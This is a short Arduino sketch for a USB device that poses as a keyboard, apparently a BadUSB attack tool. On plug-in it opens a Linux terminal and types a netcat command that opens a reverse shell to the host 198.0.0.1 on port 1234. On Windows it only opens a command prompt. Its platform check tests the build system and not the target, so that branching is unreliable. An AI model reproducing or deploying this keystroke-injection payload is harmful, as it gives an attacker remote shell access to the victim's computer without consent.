#include <Keyboard.h> 

bool executed = false;

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(2000);

}

void release_key() {

  delay(100);
  Keyboard.releaseAll();
  
}

void type_key(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void execute_linux() {
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    release_key();
    Keyboard.print("nc 198.0.0.1 1234 -e /bin/bash");
    type_key(KEY_RETURN);
    
}

void execute_windows() {
    Keyboard.press(KEY_LEFT_GUI); // Windows key
    Keyboard.press('r'); // 'r' key
    release_key();
    Keyboard.print("cmd");
    type_key(KEY_RETURN);
}
void loop() {

  if (!executed) {
      #ifdef __linux__
        execute_linux();
      #else
        execute_windows();
      #endif
      
      executed = true;
  }

    while (true) {
    delay(1000);
  }
 
}
